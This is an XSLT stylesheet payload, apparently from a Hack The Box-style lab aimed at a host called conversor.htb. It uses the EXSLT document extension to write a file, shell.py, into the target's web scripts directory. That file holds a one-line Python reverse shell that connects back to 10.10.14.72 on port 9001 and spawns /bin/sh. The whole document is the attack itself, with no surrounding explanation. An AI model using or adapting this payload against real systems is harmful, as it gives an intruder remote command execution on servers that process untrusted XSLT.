<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common" 
 extension-element-prefixes="exploit"
 version="1.0">

 <xsl:template match="/">
   <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.72",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>